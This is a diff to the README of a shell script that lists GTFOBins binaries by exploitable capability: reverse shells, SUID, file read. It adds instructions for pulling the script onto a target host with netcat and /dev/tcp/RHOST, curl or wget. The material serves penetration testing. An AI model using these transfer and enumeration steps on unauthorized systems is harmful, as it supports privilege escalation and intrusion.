@@ -41,10 +41,17 @@ Run with a single argument for a listing of commands available providing the spe
 This listing is grep friendly:
 
 ```
-$ ./gtfobinsenum.sh | head -n 3
-7z                  file-read,sudo
-aa-exec             shell,suid,sudo
+./gtfobinsenum.sh | head -n 10
 agetty              suid
+apt-get             shell,sudo
+apt                 shell,sudo
+awk                 shell,non-interactive-reverse-shell,non-interactive-bind-shell,file-write,file-read,suid,sudo,limited-suid
+base32              file-read,suid,sudo
+base64              file-read,suid,sudo
+basenc              file-read,suid,sudo
+bash                shell,reverse-shell,file-upload,file-download,file-write,file-read,library-load,suid,sudo
+cat                 file-read,suid,sudo
+chmod               suid,sudo
 ```
 
 ## Specific listing
@@ -52,11 +59,44 @@ agetty              suid
 This listing provides convenience URLs to gtfobins.github.io:
 
 ```
-$ ./gtfobinsenum.sh suid | head -n 3
-aa-exec             https://gtfobins.github.io/gtfobins/aa-exec/#suid
-agetty              https://gtfobins.github.io/gtfobins/agetty/#suid
-ar                  https://gtfobins.github.io/gtfobins/ar/#suid
+$ ./gtfobinsenum.sh file-download
+bash                https://gtfobins.github.io/gtfobins/bash/#file-download
+tar                 https://gtfobins.github.io/gtfobins/tar/#file-download
 ```
+
+# Initial download
+
+If you want to use `gtfobinsenum.sh` before knowing which `file-download` functions are available, then you might be somewhat stuck.
+
+Don't forget to `chmod +x gtfobinsenum.sh` before running it if you're putting it on disk.
+
+## With bash
+
+On your host:
+```
+nc -l -p 12345 < gtfobinsenum.sh
+```
+
+On the target host:
+```
+cat < /dev/tcp/RHOST/12345 > gtfobinsenum.sh &
+```
+
+## With curl
+
+```
+curl -LO https://raw.githubusercontent.com/fx2301/gtfobinsenum/main/gtfobinsenum.sh
+```
+
+## With wget
+
+```
+wget https://raw.githubusercontent.com/fx2301/gtfobinsenum/main/gtfobinsenum.sh
+```
+
+## With perl
+
+At the time of writing, [GTFOBins](https://gtfobins.github.io/gtfobins/perl/#file-download) didn't list perl as being able to `file-download`. Google "IO::Socket::INET" for a solution.
 
 # Regenerating
 
